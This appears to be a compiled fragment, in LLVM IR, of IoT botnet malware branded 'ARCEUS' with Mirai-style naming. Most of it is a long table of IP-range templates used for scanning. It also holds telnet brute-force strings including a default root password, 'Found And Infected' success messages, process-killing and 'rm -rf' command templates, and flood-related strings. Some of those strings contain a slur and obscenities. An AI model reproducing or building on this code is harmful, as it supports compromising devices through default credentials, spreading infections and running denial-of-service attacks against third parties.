@.str.592 = private unnamed_addr constant [14 x i8] c"191.197.%d.%d\00", align 1
@.str.593 = private unnamed_addr constant [14 x i8] c"191.198.%d.%d\00", align 1
@.str.594 = private unnamed_addr constant [14 x i8] c"152.250.%d.%d\00", align 1
@.str.595 = private unnamed_addr constant [14 x i8] c"152.251.%d.%d\00", align 1
@.str.596 = private unnamed_addr constant [14 x i8] c"152.252.%d.%d\00", align 1
@.str.597 = private unnamed_addr constant [14 x i8] c"152.253.%d.%d\00", align 1
@.str.598 = private unnamed_addr constant [14 x i8] c"152.254.%d.%d\00", align 1
@.str.599 = private unnamed_addr constant [14 x i8] c"152.255.%d.%d\00", align 1
@.str.600 = private unnamed_addr constant [14 x i8] c"177.112.%d.%d\00", align 1
@.str.601 = private unnamed_addr constant [14 x i8] c"177.113.%d.%d\00", align 1
@.str.602 = private unnamed_addr constant [14 x i8] c"177.114.%d.%d\00", align 1
@.str.603 = private unnamed_addr constant [14 x i8] c"177.115.%d.%d\00", align 1
@.str.604 = private unnamed_addr constant [14 x i8] c"177.116.%d.%d\00", align 1
@.str.605 = private unnamed_addr constant [14 x i8] c"177.117.%d.%d\00", align 1
@.str.606 = private unnamed_addr constant [14 x i8] c"177.118.%d.%d\00", align 1
@.str.607 = private unnamed_addr constant [14 x i8] c"177.119.%d.%d\00", align 1
@.str.608 = private unnamed_addr constant [14 x i8] c"177.120.%d.%d\00", align 1
@.str.609 = private unnamed_addr constant [14 x i8] c"177.121.%d.%d\00", align 1
@.str.610 = private unnamed_addr constant [14 x i8] c"177.138.%d.%d\00", align 1
@.str.611 = private unnamed_addr constant [14 x i8] c"177.139.%d.%d\00", align 1
@.str.612 = private unnamed_addr constant [14 x i8] c"177.144.%d.%d\00", align 1
@.str.613 = private unnamed_addr constant [14 x i8] c"177.145.%d.%d\00", align 1
@.str.614 = private unnamed_addr constant [14 x i8] c"177.146.%d.%d\00", align 1
@.str.615 = private unnamed_addr constant [14 x i8] c"177.147.%d.%d\00", align 1
@.str.616 = private unnamed_addr constant [14 x i8] c"177.160.%d.%d\00", align 1
@.str.617 = private unnamed_addr constant [14 x i8] c"177.161.%d.%d\00", align 1
@.str.618 = private unnamed_addr constant [14 x i8] c"177.162.%d.%d\00", align 1
@.str.619 = private unnamed_addr constant [14 x i8] c"177.163.%d.%d\00", align 1
@.str.620 = private unnamed_addr constant [14 x i8] c"177.168.%d.%d\00", align 1
@.str.621 = private unnamed_addr constant [14 x i8] c"177.169.%d.%d\00", align 1
@.str.622 = private unnamed_addr constant [14 x i8] c"177.170.%d.%d\00", align 1
@.str.623 = private unnamed_addr constant [14 x i8] c"177.171.%d.%d\00", align 1
@.str.624 = private unnamed_addr constant [14 x i8] c"177.172.%d.%d\00", align 1
@.str.625 = private unnamed_addr constant [13 x i8] c"189.96.%d.%d\00", align 1
@.str.626 = private unnamed_addr constant [13 x i8] c"189.97.%d.%d\00", align 1
@.str.627 = private unnamed_addr constant [13 x i8] c"189.98.%d.%d\00", align 1
@.str.628 = private unnamed_addr constant [13 x i8] c"189.99.%d.%d\00", align 1
@.str.629 = private unnamed_addr constant [12 x i8] c"39.34.%d.%d\00", align 1
@.str.630 = private unnamed_addr constant [13 x i8] c"59.103.%d.%d\00", align 1
@.str.631 = private unnamed_addr constant [13 x i8] c"191.12.%d.%d\00", align 1
@.str.632 = private unnamed_addr constant [14 x i8] c"186.117.%d.%d\00", align 1
@.str.633 = private unnamed_addr constant [14 x i8] c"179.131.%d.%d\00", align 1
@.str.634 = private unnamed_addr constant [14 x i8] c"179.129.%d.%d\00", align 1
@.str.635 = private unnamed_addr constant [14 x i8] c"179.170.%d.%d\00", align 1
@.str.636 = private unnamed_addr constant [14 x i8] c"191.206.%d.%d\00", align 1
@.str.637 = private unnamed_addr constant [14 x i8] c"187.118.%d.%d\00", align 1
@.str.638 = private unnamed_addr constant [14 x i8] c"187.116.%d.%d\00", align 1
@.str.639 = private unnamed_addr constant [14 x i8] c"179.224.%d.%d\00", align 1
@.str.640 = private unnamed_addr constant [14 x i8] c"179.166.%d.%d\00", align 1
@.str.641 = private unnamed_addr constant [14 x i8] c"124.105.%d.%d\00", align 1
@.str.642 = private unnamed_addr constant [13 x i8] c"119.93.%d.%d\00", align 1
@.str.643 = private unnamed_addr constant [13 x i8] c"122.54.%d.%d\00", align 1
@.str.644 = private unnamed_addr constant [13 x i8] c"122.52.%d.%d\00", align 1
@.str.645 = private unnamed_addr constant [12 x i8] c"122.3.%d.%d\00", align 1
@.str.646 = private unnamed_addr constant [11 x i8] c"5.78.%d.%d\00", align 1
@.str.647 = private unnamed_addr constant [12 x i8] c"91.98.%d.%d\00", align 1
@.str.648 = private unnamed_addr constant [13 x i8] c"49.150.%d.%d\00", align 1
@.str.649 = private unnamed_addr constant [13 x i8] c"191.80.%d.%d\00", align 1
@.str.650 = private unnamed_addr constant [13 x i8] c"191.81.%d.%d\00", align 1
@.str.651 = private unnamed_addr constant [13 x i8] c"191.82.%d.%d\00", align 1
@.str.652 = private unnamed_addr constant [13 x i8] c"191.83.%d.%d\00", align 1
@.str.653 = private unnamed_addr constant [13 x i8] c"191.84.%d.%d\00", align 1
@.str.654 = private unnamed_addr constant [13 x i8] c"191.85.%d.%d\00", align 1
@.str.655 = private unnamed_addr constant [14 x i8] c"210.213.%d.%d\00", align 1
@.str.656 = private unnamed_addr constant [12 x i8] c"59.69.%d.%d\00", align 1
@.str.657 = private unnamed_addr constant [14 x i8] c"125.104.%d.%d\00", align 1
@.str.658 = private unnamed_addr constant [13 x i8] c"119.92.%d.%d\00", align 1
@.str.659 = private unnamed_addr constant [13 x i8] c"119.91.%d.%d\00", align 1
@.str.660 = private unnamed_addr constant [13 x i8] c"49.144.%d.%d\00", align 1
@.str.661 = private unnamed_addr constant [13 x i8] c"103.20.%d.%d\00", align 1
@.str.662 = private unnamed_addr constant [13 x i8] c"103.30.%d.%d\00", align 1
@.str.663 = private unnamed_addr constant [13 x i8] c"103.47.%d.%d\00", align 1
@.str.664 = private unnamed_addr constant [13 x i8] c"103.57.%d.%d\00", align 1
@.str.665 = private unnamed_addr constant [13 x i8] c"12.188.%d.%d\00", align 1
@.str.666 = private unnamed_addr constant [12 x i8] c"12.34.%d.%d\00", align 1
@.str.667 = private unnamed_addr constant [14 x i8] c"179.105.%d.%d\00", align 1
@.str.668 = private unnamed_addr constant [14 x i8] c"179.152.%d.%d\00", align 1
@.str.669 = private unnamed_addr constant [13 x i8] c"189.29.%d.%d\00", align 1
@.str.670 = private unnamed_addr constant [13 x i8] c"189.32.%d.%d\00", align 1
@.str.671 = private unnamed_addr constant [13 x i8] c"189.33.%d.%d\00", align 1
@.str.672 = private unnamed_addr constant [13 x i8] c"189.34.%d.%d\00", align 1
@.str.673 = private unnamed_addr constant [13 x i8] c"189.35.%d.%d\00", align 1
@.str.674 = private unnamed_addr constant [13 x i8] c"189.39.%d.%d\00", align 1
@.str.675 = private unnamed_addr constant [12 x i8] c"189.4.%d.%d\00", align 1
@.str.676 = private unnamed_addr constant [13 x i8] c"189.54.%d.%d\00", align 1
@.str.677 = private unnamed_addr constant [12 x i8] c"112.5.%d.%d\00", align 1
@.str.678 = private unnamed_addr constant [14 x i8] c"117.165.%d.%d\00", align 1
@.str.679 = private unnamed_addr constant [11 x i8] c"85.3.%d.%d\00", align 1
@.str.680 = private unnamed_addr constant [13 x i8] c"41.252.%d.%d\00", align 1
@.str.681 = private unnamed_addr constant [13 x i8] c"104.55.%d.%d\00", align 1
@.str.682 = private unnamed_addr constant [13 x i8] c"78.186.%d.%d\00", align 1
@.str.683 = private unnamed_addr constant [13 x i8] c"78.189.%d.%d\00", align 1
@.str.684 = private unnamed_addr constant [14 x i8] c"221.120.%d.%d\00", align 1
@.str.685 = private unnamed_addr constant [11 x i8] c"88.5.%d.%d\00", align 1
@.str.686 = private unnamed_addr constant [13 x i8] c"41.254.%d.%d\00", align 1
@.str.687 = private unnamed_addr constant [13 x i8] c"45.117.%d.%d\00", align 1
@.str.688 = private unnamed_addr constant [13 x i8] c"101.51.%d.%d\00", align 1
@.str.689 = private unnamed_addr constant [13 x i8] c"137.59.%d.%d\00", align 1
@.str.690 = private unnamed_addr constant [13 x i8] c"14.204.%d.%d\00", align 1
@.str.691 = private unnamed_addr constant [12 x i8] c"27.50.%d.%d\00", align 1
@.str.692 = private unnamed_addr constant [12 x i8] c"27.54.%d.%d\00", align 1
@.str.693 = private unnamed_addr constant [12 x i8] c"27.98.%d.%d\00", align 1
@.str.694 = private unnamed_addr constant [12 x i8] c"36.32.%d.%d\00", align 1
@.str.695 = private unnamed_addr constant [13 x i8] c"36.248.%d.%d\00", align 1
@.str.696 = private unnamed_addr constant [12 x i8] c"39.64.%d.%d\00", align 1
@.str.697 = private unnamed_addr constant [13 x i8] c"43.253.%d.%d\00", align 1
@.str.698 = private unnamed_addr constant [13 x i8] c"43.230.%d.%d\00", align 1
@.str.699 = private unnamed_addr constant [13 x i8] c"163.53.%d.%d\00", align 1
@.str.700 = private unnamed_addr constant [13 x i8] c"43.245.%d.%d\00", align 1
@.str.701 = private unnamed_addr constant [13 x i8] c"123.25.%d.%d\00", align 1
@.str.702 = private unnamed_addr constant [13 x i8] c"103.54.%d.%d\00", align 1
@.str.703 = private unnamed_addr constant [13 x i8] c"27.255.%d.%d\00", align 1
@.str.704 = private unnamed_addr constant [14 x i8] c"103.204.%d.%d\00", align 1
@.str.705 = private unnamed_addr constant [13 x i8] c"123.24.%d.%d\00", align 1
@.str.706 = private unnamed_addr constant [14 x i8] c"113.191.%d.%d\00", align 1
@.str.707 = private unnamed_addr constant [14 x i8] c"113.188.%d.%d\00", align 1
@.str.708 = private unnamed_addr constant [14 x i8] c"113.189.%d.%d\00", align 1
@.str.709 = private unnamed_addr constant [13 x i8] c"14.160.%d.%d\00", align 1
@.str.710 = private unnamed_addr constant [13 x i8] c"14.161.%d.%d\00", align 1
@.str.711 = private unnamed_addr constant [13 x i8] c"14.162.%d.%d\00", align 1
@.str.712 = private unnamed_addr constant [13 x i8] c"14.163.%d.%d\00", align 1
@.str.713 = private unnamed_addr constant [13 x i8] c"14.164.%d.%d\00", align 1
@.str.714 = private unnamed_addr constant [13 x i8] c"14.165.%d.%d\00", align 1
@.str.715 = private unnamed_addr constant [13 x i8] c"14.166.%d.%d\00", align 1
@.str.716 = private unnamed_addr constant [13 x i8] c"14.167.%d.%d\00", align 1
@.str.717 = private unnamed_addr constant [13 x i8] c"14.168.%d.%d\00", align 1
@.str.718 = private unnamed_addr constant [13 x i8] c"14.169.%d.%d\00", align 1
@.str.719 = private unnamed_addr constant [13 x i8] c"14.170.%d.%d\00", align 1
@.str.720 = private unnamed_addr constant [13 x i8] c"14.171.%d.%d\00", align 1
@.str.721 = private unnamed_addr constant [13 x i8] c"14.172.%d.%d\00", align 1
@.str.722 = private unnamed_addr constant [13 x i8] c"14.173.%d.%d\00", align 1
@.str.723 = private unnamed_addr constant [13 x i8] c"14.174.%d.%d\00", align 1
@.str.724 = private unnamed_addr constant [13 x i8] c"14.175.%d.%d\00", align 1
@.str.725 = private unnamed_addr constant [13 x i8] c"14.176.%d.%d\00", align 1
@.str.726 = private unnamed_addr constant [13 x i8] c"14.177.%d.%d\00", align 1
@.str.727 = private unnamed_addr constant [13 x i8] c"14.178.%d.%d\00", align 1
@.str.728 = private unnamed_addr constant [13 x i8] c"14.179.%d.%d\00", align 1
@.str.729 = private unnamed_addr constant [13 x i8] c"14.180.%d.%d\00", align 1
@.str.730 = private unnamed_addr constant [13 x i8] c"14.181.%d.%d\00", align 1
@.str.731 = private unnamed_addr constant [13 x i8] c"14.182.%d.%d\00", align 1
@.str.732 = private unnamed_addr constant [13 x i8] c"14.183.%d.%d\00", align 1
@.str.733 = private unnamed_addr constant [13 x i8] c"14.184.%d.%d\00", align 1
@.str.734 = private unnamed_addr constant [13 x i8] c"14.185.%d.%d\00", align 1
@.str.735 = private unnamed_addr constant [13 x i8] c"14.186.%d.%d\00", align 1
@.str.736 = private unnamed_addr constant [13 x i8] c"14.187.%d.%d\00", align 1
@.str.737 = private unnamed_addr constant [13 x i8] c"14.188.%d.%d\00", align 1
@.str.738 = private unnamed_addr constant [13 x i8] c"14.189.%d.%d\00", align 1
@.str.739 = private unnamed_addr constant [13 x i8] c"14.190.%d.%d\00", align 1
@.str.740 = private unnamed_addr constant [13 x i8] c"14.191.%d.%d\00", align 1
@.str.741 = private unnamed_addr constant [13 x i8] c"45.121.%d.%d\00", align 1
@.str.742 = private unnamed_addr constant [13 x i8] c"45.120.%d.%d\00", align 1
@.str.743 = private unnamed_addr constant [13 x i8] c"45.115.%d.%d\00", align 1
@.str.744 = private unnamed_addr constant [13 x i8] c"43.252.%d.%d\00", align 1
@.str.745 = private unnamed_addr constant [13 x i8] c"43.240.%d.%d\00", align 1
@.str.746 = private unnamed_addr constant [13 x i8] c"41.174.%d.%d\00", align 1
@.str.747 = private unnamed_addr constant [13 x i8] c"45.127.%d.%d\00", align 1
@.str.748 = private unnamed_addr constant [13 x i8] c"123.16.%d.%d\00", align 1
@.str.749 = private unnamed_addr constant [13 x i8] c"202.44.%d.%d\00", align 1
@.str.750 = private unnamed_addr constant [13 x i8] c"116.93.%d.%d\00", align 1
@.str.751 = private unnamed_addr constant [13 x i8] c"41.253.%d.%d\00", align 1
@.str.752 = private unnamed_addr constant [14 x i8] c"117.173.%d.%d\00", align 1
@.str.753 = private unnamed_addr constant [14 x i8] c"113.190.%d.%d\00", align 1
@.str.754 = private unnamed_addr constant [14 x i8] c"112.196.%d.%d\00", align 1
@.str.755 = private unnamed_addr constant [14 x i8] c"113.178.%d.%d\00", align 1
@.str.756 = private unnamed_addr constant [13 x i8] c"112.45.%d.%d\00", align 1
@.str.757 = private unnamed_addr constant [14 x i8] c"183.223.%d.%d\00", align 1
@.str.758 = private unnamed_addr constant [13 x i8] c"116.71.%d.%d\00", align 1
@.str.759 = private unnamed_addr constant [13 x i8] c"103.44.%d.%d\00", align 1
@.str.760 = private unnamed_addr constant [14 x i8] c"110.235.%d.%d\00", align 1
@.str.761 = private unnamed_addr constant [14 x i8] c"124.253.%d.%d\00", align 1
@.str.762 = private unnamed_addr constant [14 x i8] c"211.237.%d.%d\00", align 1
@.str.763 = private unnamed_addr constant [14 x i8] c"117.175.%d.%d\00", align 1
@.str.764 = private unnamed_addr constant [12 x i8] c"111.9.%d.%d\00", align 1
@.str.765 = private unnamed_addr constant [14 x i8] c"222.252.%d.%d\00", align 1
@.str.766 = private unnamed_addr constant [14 x i8] c"113.174.%d.%d\00", align 1
@.str.767 = private unnamed_addr constant [14 x i8] c"113.160.%d.%d\00", align 1
@.str.768 = private unnamed_addr constant [14 x i8] c"113.161.%d.%d\00", align 1
@.str.769 = private unnamed_addr constant [14 x i8] c"113.162.%d.%d\00", align 1
@.str.770 = private unnamed_addr constant [14 x i8] c"113.163.%d.%d\00", align 1
@.str.771 = private unnamed_addr constant [14 x i8] c"113.164.%d.%d\00", align 1
@.str.772 = private unnamed_addr constant [14 x i8] c"113.165.%d.%d\00", align 1
@.str.773 = private unnamed_addr constant [14 x i8] c"113.166.%d.%d\00", align 1
@.str.774 = private unnamed_addr constant [14 x i8] c"113.167.%d.%d\00", align 1
@.str.775 = private unnamed_addr constant [14 x i8] c"113.168.%d.%d\00", align 1
@.str.776 = private unnamed_addr constant [14 x i8] c"113.169.%d.%d\00", align 1
@.str.777 = private unnamed_addr constant [13 x i8] c"123.17.%d.%d\00", align 1
@.str.778 = private unnamed_addr constant [13 x i8] c"123.21.%d.%d\00", align 1
@.str.779 = private unnamed_addr constant [13 x i8] c"123.22.%d.%d\00", align 1
@.str.780 = private unnamed_addr constant [14 x i8] c"222.253.%d.%d\00", align 1
@.str.781 = private unnamed_addr constant [14 x i8] c"222.254.%d.%d\00", align 1
@.str.782 = private unnamed_addr constant [14 x i8] c"222.255.%d.%d\00", align 1
@.str.783 = private unnamed_addr constant [13 x i8] c"41.208.%d.%d\00", align 1
@.str.784 = private unnamed_addr constant [14 x i8] c"103.198.%d.%d\00", align 1
@.str.785 = private unnamed_addr constant [13 x i8] c"88.248.%d.%d\00", align 1
@.str.786 = private unnamed_addr constant [13 x i8] c"88.105.%d.%d\00", align 1
@.str.787 = private unnamed_addr constant [13 x i8] c"88.247.%d.%d\00", align 1
@.str.788 = private unnamed_addr constant [13 x i8] c"85.105.%d.%d\00", align 1
@.str.789 = private unnamed_addr constant [12 x i8] c"188.3.%d.%d\00", align 1
@.str.790 = private unnamed_addr constant [14 x i8] c"103.203.%d.%d\00", align 1
@.str.791 = private unnamed_addr constant [13 x i8] c"103.55.%d.%d\00", align 1
@.str.792 = private unnamed_addr constant [14 x i8] c"103.220.%d.%d\00", align 1
@.str.793 = private unnamed_addr constant [14 x i8] c"183.233.%d.%d\00", align 1
@.str.794 = private unnamed_addr constant [14 x i8] c"103.242.%d.%d\00", align 1
@.str.795 = private unnamed_addr constant [13 x i8] c"103.14.%d.%d\00", align 1
@.str.796 = private unnamed_addr constant [14 x i8] c"103.195.%d.%d\00", align 1
@.str.797 = private unnamed_addr constant [14 x i8] c"103.214.%d.%d\00", align 1
@.str.798 = private unnamed_addr constant [14 x i8] c"103.218.%d.%d\00", align 1
@.str.799 = private unnamed_addr constant [14 x i8] c"103.225.%d.%d\00", align 1
@.str.800 = private unnamed_addr constant [14 x i8] c"103.228.%d.%d\00", align 1
@.str.801 = private unnamed_addr constant [14 x i8] c"103.231.%d.%d\00", align 1
@.str.802 = private unnamed_addr constant [13 x i8] c"103.60.%d.%d\00", align 1
@.str.803 = private unnamed_addr constant [14 x i8] c"103.248.%d.%d\00", align 1
@.str.804 = private unnamed_addr constant [14 x i8] c"103.253.%d.%d\00", align 1
@.str.805 = private unnamed_addr constant [14 x i8] c"103.255.%d.%d\00", align 1
@.str.806 = private unnamed_addr constant [14 x i8] c"113.176.%d.%d\00", align 1
@.str.807 = private unnamed_addr constant [14 x i8] c"113.175.%d.%d\00", align 1
@.str.808 = private unnamed_addr constant [14 x i8] c"203.134.%d.%d\00", align 1
@.str.809 = private unnamed_addr constant [14 x i8] c"203.210.%d.%d\00", align 1
@.str.810 = private unnamed_addr constant [14 x i8] c"117.176.%d.%d\00", align 1
@.str.811 = private unnamed_addr constant [14 x i8] c"117.171.%d.%d\00", align 1
@.str.812 = private unnamed_addr constant [14 x i8] c"117.162.%d.%d\00", align 1
@.str.813 = private unnamed_addr constant [14 x i8] c"203.150.%d.%d\00", align 1
@.str.814 = private unnamed_addr constant [14 x i8] c"157.119.%d.%d\00", align 1
@.str.815 = private unnamed_addr constant [13 x i8] c"43.228.%d.%d\00", align 1
@.str.816 = private unnamed_addr constant [13 x i8] c"162.12.%d.%d\00", align 1
@.str.817 = private unnamed_addr constant [14 x i8] c"115.220.%d.%d\00", align 1
@.str.818 = private unnamed_addr constant [14 x i8] c"125.114.%d.%d\00", align 1
@.str.819 = private unnamed_addr constant [13 x i8] c"37.158.%d.%d\00", align 1
@.str.820 = private unnamed_addr constant [11 x i8] c"95.9.%d.%d\00", align 1
@.str.821 = private unnamed_addr constant [12 x i8] c"58.71.%d.%d\00", align 1
@.str.822 = private unnamed_addr constant [11 x i8] c"1.56.%d.%d\00", align 1
@.str.823 = private unnamed_addr constant [12 x i8] c"1.188.%d.%d\00", align 1
@.str.824 = private unnamed_addr constant [11 x i8] c"27.0.%d.%d\00", align 1
@.str.825 = private unnamed_addr constant [11 x i8] c"27.8.%d.%d\00", align 1
@.str.826 = private unnamed_addr constant [13 x i8] c"27.112.%d.%d\00", align 1
@.str.827 = private unnamed_addr constant [13 x i8] c"27.192.%d.%d\00", align 1
@.str.828 = private unnamed_addr constant [11 x i8] c"42.4.%d.%d\00", align 1
@.str.829 = private unnamed_addr constant [12 x i8] c"42.48.%d.%d\00", align 1
@.str.830 = private unnamed_addr constant [12 x i8] c"42.52.%d.%d\00", align 1
@.str.831 = private unnamed_addr constant [12 x i8] c"42.56.%d.%d\00", align 1
@.str.832 = private unnamed_addr constant [12 x i8] c"42.63.%d.%d\00", align 1
@.str.833 = private unnamed_addr constant [12 x i8] c"42.84.%d.%d\00", align 1
@.str.834 = private unnamed_addr constant [13 x i8] c"42.176.%d.%d\00", align 1
@.str.835 = private unnamed_addr constant [13 x i8] c"42.224.%d.%d\00", align 1
@.str.836 = private unnamed_addr constant [11 x i8] c"60.0.%d.%d\00", align 1
@.str.837 = private unnamed_addr constant [12 x i8] c"60.16.%d.%d\00", align 1
@.str.838 = private unnamed_addr constant [12 x i8] c"62.30.%d.%d\00", align 1
@.str.839 = private unnamed_addr constant [13 x i8] c"62.252.%d.%d\00", align 1
@.str.840 = private unnamed_addr constant [13 x i8] c"62.254.%d.%d\00", align 1
@.str.841 = private unnamed_addr constant [13 x i8] c"62.255.%d.%d\00", align 1
@.str.842 = private unnamed_addr constant [12 x i8] c"77.96.%d.%d\00", align 1
@.str.843 = private unnamed_addr constant [12 x i8] c"77.97.%d.%d\00", align 1
@.str.844 = private unnamed_addr constant [12 x i8] c"77.98.%d.%d\00", align 1
@.str.845 = private unnamed_addr constant [13 x i8] c"77.100.%d.%d\00", align 1
@.str.846 = private unnamed_addr constant [13 x i8] c"77.102.%d.%d\00", align 1
@.str.847 = private unnamed_addr constant [13 x i8] c"81.100.%d.%d\00", align 1
@.str.848 = private unnamed_addr constant [13 x i8] c"94.174.%d.%d\00", align 1
@.str.849 = private unnamed_addr constant [13 x i8] c"49.118.%d.%d\00", align 1
@.str.850 = private unnamed_addr constant [13 x i8] c"78.188.%d.%d\00", align 1
@.str.851 = private unnamed_addr constant [12 x i8] c"14.33.%d.%d\00", align 1
@.str.852 = private unnamed_addr constant [12 x i8] c"91.83.%d.%d\00", align 1
@.str.853 = private unnamed_addr constant [13 x i8] c"146.88.%d.%d\00", align 1
@.str.854 = private unnamed_addr constant [13 x i8] c"183.71.%d.%d\00", align 1
@.str.855 = private unnamed_addr constant [14 x i8] c"192.168.%d.%d\00", align 1
@.str.856 = private unnamed_addr constant [12 x i8] c"89.71.%d.%d\00", align 1
@.str.857 = private unnamed_addr constant [13 x i8] c"244.77.%d.%d\00", align 1
@.str.858 = private unnamed_addr constant [13 x i8] c"125.27.%d.%d\00", align 1
@.str.859 = private unnamed_addr constant [14 x i8] c"101.105.%d.%d\00", align 1
@.str.860 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.861 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.862 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.863 = private unnamed_addr constant [8 x i8] c"admin\0D\0A\00", align 1
@.str.864 = private unnamed_addr constant [84 x i8] c"[ARCEUS] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.865 = private unnamed_addr constant [14 x i8] c"DICK %s:%s:%s\00", align 1
@.str.866 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.867 = private unnamed_addr constant [134 x i8] c"\1B[0;31m[ARCEUS] Successfully Bruted IP: \1B[0;33m%s\1B[0;31m Port: \1B[0;33m23 \1B[0;31mUsername: \1B[0;33m%s \1B[0;31mPassword: \1B[0;33m%s\1B[0;37m\00", align 1
@.str.868 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.869 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.870 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.871 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.872 = private unnamed_addr constant [10 x i8] c"CONNECTED\00", align 1
@.str.873 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.874 = private unnamed_addr constant [55 x i8] c"\1B[96m[PHONE] \1B[97mFound And Infected A Phone \1B[96m[%s]\00", align 1
@.str.875 = private unnamed_addr constant [5 x i8] c"su\0D\0A\00", align 1
@.str.876 = private unnamed_addr constant [13 x i8] c"oelinux123\0D\0A\00", align 1
@.str.877 = private unnamed_addr constant [57 x i8] c"\1B[96m[TELNET] \1B[97mFound And Infected A Telnet \1B[96m[%s]\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.878, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.879, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.880, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.881, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.882, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.883, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.884, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.885, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.886, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.887, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.888, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.889, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.890, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.891, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.892, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.893, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.894, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.895, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.896, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.897, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.898, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.899, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.900, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.901, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.902, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.903, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.904, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.905, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.906, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.907, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.908, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.909, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.910, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.911, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.912, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.913, i32 0, i32 0)], align 16
@.str.878 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.879 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.880 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.881 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.882 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.883 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.884 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.885 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.886 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.887 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.888 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.889 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.890 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.891 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.892 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.893 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.894 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.895 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.896 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.897 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.898 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.899 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.900 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.901 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.902 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.903 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.904 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.905 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.906 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
